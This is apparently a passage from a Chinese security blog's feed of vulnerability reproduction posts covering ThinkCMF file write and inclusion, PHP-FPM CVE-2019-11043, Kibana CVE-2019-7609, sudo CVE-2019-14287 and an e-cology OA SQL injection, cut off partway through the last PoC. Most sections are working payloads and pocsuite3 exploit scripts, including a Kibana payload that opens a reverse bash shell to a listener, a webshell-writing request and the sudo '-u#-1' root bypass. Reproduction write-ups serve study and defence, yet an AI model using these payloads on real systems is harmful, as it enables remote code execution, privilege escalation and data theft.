title="漏洞利用"></a>漏洞利用</h2><p><strong>第一种</strong><br>通过构造a参数的fetch方法，可以不需要知道文件路径就可以把php代码写入文件</p><p>phpinfo版payload如下：</p><p><code>?a=fetch&amp;templateFile=public/index&amp;prefix=&#39;&#39;&amp;content=&lt;php&gt;file_put_contents(&#39;test.php&#39;,&#39;&lt;?php phpinfo(); ?&gt;&#39;)&lt;/php&gt;</code></p><p>执行结果如下：</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191024121913.png" alt></p><p>访问写入的文件</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191024122021.png" alt></p><p><strong>第二种</strong></p><p>通过构造a参数的display方法，实现任意内容包含漏洞</p><p>payload:</p><p><code>?a=display&amp;templateFile=README.md</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191024122420.png" alt></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><pre><code>#! python3&quot;&quot;&quot;@FileName: thinkcmf_2_2_3_file_inclusion.py@Author: dylan@software: PyCharm @Datetime: 2019-10-24 13:55&quot;&quot;&quot;import urllib.parsefrom pocsuite3.api import Output, POCBase, register_poc, requests, loggerclass DemoPOC(POCBase):    vulID = &quot;0&quot;  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0    version = &quot;3.0&quot;  # 默认为1    author = &quot;dylan&quot;  # PoC作者的大名    vulDate = &quot;2019/10/24&quot;  # 漏洞公开的时间,不知道就写今天    createDate = &quot;2019/10/24&quot;  # 编写 PoC 的日期    updateDate = &quot;2019/10/24&quot;  # PoC 更新的时间,默认和编写时间一样    references = [        &quot;https://dylan903.coding.me/2019/10/24/thinkcmf-kuang-jia-ren-yi-nei-rong-bao-han-lou-dong-fu-xian/&quot;]  # 漏洞地址来源,0day不用写    name = &quot;thinkcmf_2_2_3_file_inclusion&quot;  # PoC 名称    appPowerLink = &quot;&quot;  # 漏洞厂商主页地址    appName = &quot;ThinkCMF&quot;  # 漏洞应用名称    appVersion = &#39;ThinkCMF X1.6.0、X2.1.0、X2.2.0、X2.2.1、X2.2.2、X2.2.3&#39;  # 漏洞影响版本    vulType = &quot;File Inclusion&quot;  # 漏洞类型,类型参考见 漏洞类型规范表    desc = &quot;&quot;&quot;    &quot;&quot;&quot;  # 漏洞简要描述    samples = [&quot;&quot;]  # 测试样列,就是用 PoC 测试成功的网站    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写    pocDesc = &quot;&quot;&quot;    &quot;&quot;&quot;    def _verify(self):        # 验证代码        result = {}        payload1 = &#39;?a=fetch&amp;templateFile=public/index&amp;prefix=%27%27&amp;content=&lt;php&gt;file_put_contents(%27test.php%27,&#39; \                   &#39;%27hello world!%27)&lt;/php&gt; &#39;        payload2 = &#39;?a=display&amp;templateFile=Nginx.conf&#39;        path1 = self.url + payload1        path2 = self.url + payload2        respose1 = requests.get(path1, verify=False, timeout=30)        respose2 = requests.get(self.url + &quot;/test.php&quot;, verify=False, timeout=30)        respose3 = requests.get(path2, verify=False, timeout=30)        if &#39;hello world!&#39; in respose2.text:  # result是返回结果            result[&#39;VerifyInfo&#39;] = {}            result[&#39;VerifyInfo&#39;][&#39;URL&#39;] = self.url            result[&#39;VerifyInfo&#39;][&#39;VUL1&#39;] = &quot;目标存在文件写入漏洞&quot;        if &#39;location&#39; in respose3.text:            result[&#39;VerifyInfo&#39;][&#39;VUL2&#39;] = &quot;目标存在文件包含漏洞&quot;        return self.parse_output(result)    def _attack(self):        # 攻击代码        return self._verify()    def parse_output(self, result):        output = Output(self)        if result:            output.success(result)        else:            output.fail(&quot;Internet nothing returned&quot;)        return output# 注册 DemoPOC 类register_poc(DemoPOC)</code></pre><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.freebuf.com/vuls/217586.html" target="_blank" rel="noopener">ThinkCMF框架上的任意内容包含漏洞 - FreeBuf互联网安全新媒体平台</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzA4NzUwMzc3NQ==&mid=2247483900&idx=1&sn=028d4d1c0f804af29594380de17ebf93" target="_blank" rel="noopener">ThinkCMF框架任意内容包含漏洞分析复现</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> ThinkCMF </tag>
            
            <tag> 任意内容包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP-FPM在Nginx特定配置下远程代码执行漏洞复现</title>
      <link href="/2019/10/23/php-fpm-zai-nginx-te-ding-pei-zhi-xia-yuan-cheng-dai-ma-zhi-xing-lou-dong-fu-xian/"/>
      <url>/2019/10/23/php-fpm-zai-nginx-te-ding-pei-zhi-xia-yuan-cheng-dai-ma-zhi-xing-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h1><p>在9 月 14 日至 18 举办的 Real World CTF 中，国外安全研究员 Andrew Danau 在解决一道 CTF 题目时发现，<br>向目标服务器 URL 发送 %0a 符号时，服务返回异常，疑似存在漏洞。</p><p>Nginx 上 fastcgi_split_path_info 在处理带有 %0a 的请求时，会因为遇到换行符 \n 导致 PATH_INFO 为空。<br>而 php-fpm 在处理 PATH_INFO 为空的情况下，存在逻辑缺陷。<br>攻击者通过精心的构造和利用，可以导致远程代码执行。</p><p>漏洞编号：CVE-2019-11043</p><p>漏洞 PoC 在 10 月 22 日公开。</p><h1 id="0x02-影响范围"><a href="#0x02-影响范围" class="headerlink" title="0x02 影响范围"></a>0x02 影响范围</h1><p><strong>PHP 5.6-7.x</strong></p><p>Nginx + php-fpm 的服务器，在使用如下配置的情况下，都可能存在远程代码执行漏洞。</p><pre><code> location ~ [^/]\.php(/|$) {        fastcgi_split_path_info ^(.+?\.php)(/.*)$;        fastcgi_param PATH_INFO       $fastcgi_path_info;        fastcgi_pass   php:9000;        ...  }}</code></pre><h1 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h1><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p>攻击机：Windows 10<br>靶    机:  Vulhub靶场</p><p><a href="https://github.com/vulhub/vulhub/tree/master/php/CVE-2019-11043" target="_blank" rel="noopener">Vulhub</a>已有相关漏洞靶场，按教程搭建即可。</p><pre><code>mkdir CVE-2019-11043cd CVE-2019-11043/wget https://raw.githubusercontent.com/vulhub/vulhub/master/php/CVE-2019-11043/default.confwget https://raw.githubusercontent.com/vulhub/vulhub/master/php/CVE-2019-11043/docker-compose.ymlmkdir wwwcd www/wget https://raw.githubusercontent.com/vulhub/vulhub/master/php/CVE-2019-11043/www/index.phpcd ../service docker startdocker-compose up -d</code></pre><p>搭建好之后，访问 <code>http://ip:8080/index.php</code> 即可。</p><p>在<a href="https://github.com/neex/phuip-fpizdam" target="_blank" rel="noopener">Github</a>下载相应的工具<br>(需要安装Git，或者直接下载)<br>生成<code>phuip-fpizdam</code>工具<br>（需要安装go环境）</p><pre><code>git clone https://github.com/neex/phuip-fpizdam.gitcd phuip-fpizdamgo build</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191023223540.png" alt></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>在生成工具的文件夹 执行命令</p><p><code>phuip-fpizdam.exe http://ip:8080/index.php</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191023223937.png" alt></p><p>然后访问</p><p><code>http://your-ip:8080/index.php?a=id</code></p><p><strong>注意，因为php-fpm会启动多个子进程，在访问/index.php?a=id时需要多访问几次，以访问到被污染的进程。</strong></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191023224120.png" alt></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://github.com/neex/phuip-fpizdam" target="_blank" rel="noopener">phuip-fpizdam: Exploit for CVE-2019-11043</a><br><a href="https://bugs.php.net/bug.php?id=78599" target="_blank" rel="noopener">PHP :: Sec Bug #78599 :: env_path_info underflow in fpm_main.c can lead to RCE</a><br><a href="https://qiita.com/shimizukawasaki/items/39d68a7c658dfa50263d?from=timeline&isappinstalled=0" target="_blank" rel="noopener">[漏洞复现]CVE-2019-11043/PHP-FPM在Nginx特定配置下远程代码执行 - Qiita</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> PHP </tag>
            
            <tag> Nginx </tag>
            
            <tag> CVE-2019-11043 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kibana远程代码执行漏洞复现</title>
      <link href="/2019/10/20/kibana-rce-lou-dong-fu-xian/"/>
      <url>/2019/10/20/kibana-rce-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h1><p>Elasticsearch Kibana是荷兰Elasticsearch公司的一套开源的、基于浏览器的分析和搜索Elasticsearch仪表板工具。<br>Kibana 5.6.15之前版本和6.6.1之前版本中的Timelion visualizer存在安全漏洞。<br>远程攻击者可通过发送请求利用该漏洞执行JavaScript代码并能以Kibana进程权限执行任意命令。</p><h1 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h1><pre><code>ElasticSearch Kibana &lt;5.6.15ElasticSearch Kibana &lt;6.6.1</code></pre><h1 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h1><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191022192025.png" alt></p><p>该漏洞触发，需要<code>Timelion</code> 和 <code>Canvas</code>插件</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191022191915.png" alt></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>在服务器监听<br>payload里面设置的什么端口，就监听什么端口。</p><p><code>nc -lvvp 12345</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191022204934.png" alt></p><p>点在Timelion处,直接填入payload，点击run<br><strong>（如果有设置用户认证，则需要先登陆）</strong><br>过程和结果如图</p><p><strong>payload：</strong></p><pre><code>.es(*).props(label.__proto__.env.AAAA=&#39;require(&quot;child_process&quot;).exec(&quot;bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1&quot;);process.exit()//&#39;).props(label.__proto__.env.NODE_OPTIONS=&#39;--require /proc/self/environ&#39;)</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191022210726.png" alt></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191022192538.png" alt></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191022205351.png" alt></p><p><strong>POC</strong></p><pre><code>#! python3&quot;&quot;&quot;@FileName: elasticsearch_kibana_rce.py@Author: dylan@software: PyCharm @Datetime: 2019-10-20 15:23:54&quot;&quot;&quot;import refrom collections import OrderedDictimport jsonimport urllib.parsefrom bs4 import BeautifulSoupfrom pocsuite3.api import Output, POCBase, register_poc, requests, OptStringclass DemoPOC(POCBase):    vulID = &quot;CVE-2019-7609&quot;  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0    version = &quot;3.0&quot;  # 默认为1    author = &quot;dylan&quot;  # PoC作者的大名    vulDate = &quot;2019/10/20&quot;  # 漏洞公开的时间,不知道就写今天    createDate = &quot;2019/10/20&quot;  # 编写 PoC 的日期    updateDate = &quot;2019/10/20&quot;  # PoC 更新的时间,默认和编写时间一样    references = [&quot;https://github.com/jas502n/kibana-RCE&quot;]  # 漏洞地址来源,0day不用写    name = &quot;elasticsearch_kibana_rce&quot;  # PoC 名称    appPowerLink = &quot;&quot;  # 漏洞厂商主页地址    appName = &quot;elasticsearch_kibana&quot;  # 漏洞应用名称    appVersion = &quot;Kibana &lt; 6.6.1,Kibana &lt; 5.6.15&quot;  # 漏洞影响版本    vulType = &quot;rce&quot;  # 漏洞类型,类型参考见 漏洞类型规范表    desc = &quot;&quot;&quot;        Need Timelion And Canvas    &quot;&quot;&quot;  # 漏洞简要描述    samples = []  # 测试样列,就是用 PoC 测试成功的网站    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写    pocDesc = &quot;&quot;&quot;    pocsuite -r &quot;elasticsearch_kibana_rce.py&quot; -u 目标ip --ncip &quot;监听ip&quot; --ncport &quot;监听端口&quot;    pocsuite -r &quot;elasticsearch_kibana_rce.py&quot; -u https://192.168.1.1 --ncip &quot;192.168.1.1&quot; --ncport &quot;12345&quot;    &quot;&quot;&quot;    def _options(self):        o = OrderedDict()        o[&quot;ncip&quot;] = OptString(&#39;&#39;, description=&#39;请输入监听服务器IP&#39;, require=True)        o[&quot;ncport&quot;] = OptString(&#39;&#39;, description=&#39;请输入监听服务器端口&#39;, require=True)        return o    def _verify(self):        # 验证代码        result = {}        output = Output(self)        path1 = self.url + &quot;/app/timelion&quot;        path2 = self.url + &quot;/api/timelion/run&quot;        payload = {            &quot;sheet&quot;: [                &quot;.es(*).props(label.__proto__.env.AAAA=&#39;require(\&quot;child_process\&quot;).exec(\&quot;bash -i &gt;&amp; &quot;                &quot;/dev/tcp/&quot; + self.get_option(&quot;ncip&quot;) + &quot;/&quot; + self.get_option(                    &quot;ncport&quot;) + &quot; 0&gt;&amp;1\&quot;);process.exit()//&#39;)\n.props(&quot;                                &quot;label.__proto__.env.NODE_OPTIONS=&#39;--require /proc/self/environ&#39;)&quot;],            &quot;time&quot;: {&quot;from&quot;: &quot;now-15m&quot;, &quot;to&quot;: &quot;now&quot;, &quot;mode&quot;: &quot;quick&quot;, &quot;interval&quot;: &quot;auto&quot;,                     &quot;timezone&quot;: &quot;Asia/Shanghai&quot;}        }        html = requests.get(path1, verify=False, timeout=120).text        # print(html)        soup = BeautifulSoup(html, &#39;lxml&#39;)        kbn_version = re.compile(&#39;\d\.\d\.\d&#39;).search(str(soup.find(&quot;kbn-injected-metadata&quot;))).group(0)        # print(kbn_version)        header = {            &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0&quot;,            &#39;Accept&#39;: &#39;application/json, text/plain, */*&#39;,            &quot;Accept-Language&quot;: &quot;zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3&quot;,            &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,            &#39;Connection&#39;: &#39;close&#39;,            &#39;kbn-version&#39;: kbn_version,            &#39;Content-Type&#39;: &#39;application/json;charset=UTF-8&#39;        }        respose2 = requests.post(path2, headers=header, data=json.dumps(payload), verify=False, timeout=30)        # print(respose2.status_code)        if respose2.status_code == 200:  # result是返回结果            result[&#39;VerifyInfo&#39;] = {}            result[&#39;VerifyInfo&#39;][&#39;URL&#39;] = self.url            result[&#39;VerifyInfo&#39;][&#39;Referer&#39;] = &quot;&quot;        return self.parse_output(result)    def _attack(self):        # 攻击代码        return self._verify()    def parse_output(self, result):        output = Output(self)        if result:            output.success(result)        else:            output.fail(&quot;target is not vulnerable&quot;)        return output# 注册 DemoPOC 类register_poc(DemoPOC)</code></pre><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://github.com/jas502n/kibana-RCE" target="_blank" rel="noopener">kibana-RCE: kibana &lt; 6.6.0 未授权远程代码命令执行 (Need Timelion And Canvas),CVE-2019-7609</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> kibana </tag>
            
            <tag> Elasticsearch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux sudo 提权漏洞(CVE-2019-14287)复现</title>
      <link href="/2019/10/15/linux-sudo-root-quan-xian-rao-guo-lou-dong-cve-2019-14287-fu-xian/"/>
      <url>/2019/10/15/linux-sudo-root-quan-xian-rao-guo-lou-dong-cve-2019-14287-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-漏洞概述"><a href="#0x00-漏洞概述" class="headerlink" title="0x00 漏洞概述"></a>0x00 漏洞概述</h1><p>2019年10月14日， sudo 官方在发布了CVE-2019-14287的漏洞预警。</p><p>sudo 是所有 unix操作系统(BSD, MacOS, GNU/Linux) 基本集成的一个用户权限控制/切换程序。<br>允许管理员控制服务器下用户能够切换的用户权限。<br>CVE-2019-14287是管理员在配置文件中用了ALL关键词后造成的。<br>但默认的sudo配置文件不受影响。</p><h1 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h1><p><strong>1.8.28之前的Sudo版本会受到影响。</strong></p><h1 id="0x02-漏洞详情"><a href="#0x02-漏洞详情" class="headerlink" title="0x02 漏洞详情"></a>0x02 漏洞详情</h1><p>当 /etc/sudoers 文件存在如下形式的配置会导致漏洞的产生</p><p><code>username  ALL=(ALL, !root) ALL</code></p><p>即使限制了用户以root用户身份运行特定命令或任何命令，<br>该漏洞也可能允许用户绕过此安全策略并完全控制系统。</p><p>攻击者可以利用此漏洞，只需指定用户ID“ -1”或“ 4294967295”即可以root身份运行命令而不受限制。</p><p>这是因为将用户ID转换为用户名的函数将-1或其无符号等效4294967295误认为是0，<br>该值始终是root用户的用户ID。<br>此外，由于通过–u 选项指定的用户 ID 并不存在于密码数据库中，<br>因此不会运行任何 PAM 会话模块。</p><p><code>sudo -u＃-1 id -u</code><br>或者<br><code>sudo -u＃4294967295 id -u</code></p><h1 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h1><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191015161111.png" alt></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.sudo.ws/alerts/minus_1_uid.html" target="_blank" rel="noopener">https://www.sudo.ws/alerts/minus_1_uid.html</a><br><a href="https://news.ssssafe.com/archives/3266" target="_blank" rel="noopener">https://news.ssssafe.com/archives/3266</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> Linux </tag>
            
            <tag> 提权 </tag>
            
            <tag> sudo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>泛微OA  WorkflowCenterTreeData接口注入漏洞复现</title>
      <link href="/2019/10/10/fan-wei-oa-workflowcentertreedata-jie-kou-zhu-ru-lou-dong-fu-xian/"/>
      <url>/2019/10/10/fan-wei-oa-workflowcentertreedata-jie-kou-zhu-ru-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>在CNVD上刚发现泛微OA的新漏洞，就有大佬发出漏洞细节，就进行了复现。</p><h1 id="0x02-漏洞影响"><a href="#0x02-漏洞影响" class="headerlink" title="0x02 漏洞影响"></a>0x02 漏洞影响</h1><p>攻击者可利用漏洞获取数据库敏感信息。</p><p><strong>（限Oracle数据库）</strong></p><p> 影响版本 暂不明确</p><h1 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h1><p>泛微e-cology OA系统的WorkflowCenterTreeData接口在使用oracle数据库时,由于内置sql语句拼接不严,导致其存在sql注入漏洞</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191010155307.png" alt></p><h1 id="0x04-漏洞复现"><a href="#0x04-漏洞复现" class="headerlink" title="0x04 漏洞复现"></a>0x04 漏洞复现</h1><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>直接抓包，使用payload请求</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191010155058.png" alt></p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><pre><code>POST /mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&amp;scope=2333 HTTP/1.1Host: ip:portUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 2236Connection: closeUpgrade-Insecure-Requests: 1 formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select NULL,value from v$parameter order by (((1</code></pre><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><pre><code>#! python3&quot;&quot;&quot;@FileName: e_cology_oa_workflow_sqli.py.py@Author: dylan@software: PyCharm @Datetime: 2019-10-10 15:05&quot;&quot;&quot;from pocsuite3.api import Output, POCBase, register_poc, requests, loggerimport urllib3urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)class DemoPOC(POCBase):    vulID = &quot;&quot;  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0    version = &quot;3.0&quot;  # 默认为1    author = &quot;dylan&quot;  # PoC作者的大名    vulDate = &quot;2019/10/10&quot;  # 漏洞公开的时间,不知道就写今天    createDate = &quot;2019/10/10&quot;  # 编写 PoC 的日期    updateDate = &quot;2019/10/10&quot;  # PoC 更新的时间,默认和编写时间一样    references = [&quot;&quot;]  # 漏洞地址来源,0day不用写    name = &quot;e_cology_oa_workflow_sqli&quot;  # PoC 名称    appPowerLink = &quot;&quot;  # 漏洞厂商主页地址    appName = &quot;泛微e-cology OA&quot;  # 漏洞应用名称    appVersion = &quot;&quot;  # 漏洞影响版本    vulType = &quot;sqli&quot;  # 漏洞类型,类型参考见 漏洞类型规范表    desc = &quot;&quot;&quot;        只影响Oracle数据库    &quot;&quot;&quot;  # 漏洞简要描述    samples = [&quot;&quot;]  # 测试样列,就是用 PoC 测试成功的网站    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写    pocDesc = &quot;&quot;&quot;    &quot;&quot;&quot;    def _verify(self):        # 验证代码        result = {}        headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0&quot;,                   &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,&quot;                             &quot;application/xml;q=0.9,*/*;q=0.8&quot;,                   &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;,                   &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,                   &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;,                   &quot;Connection&quot;: &quot;close&quot;,                   &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;}        data = &quot;formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d&quot; \               &quot;%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a&quot; \               &quot;%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d&quot; \               &quot;%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a&quot; \               &quot;%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d&quot; \               &quot;%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a&quot; \               &quot;%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d&quot; \               &quot;%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a&quot; \               &quot;%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d&quot; \               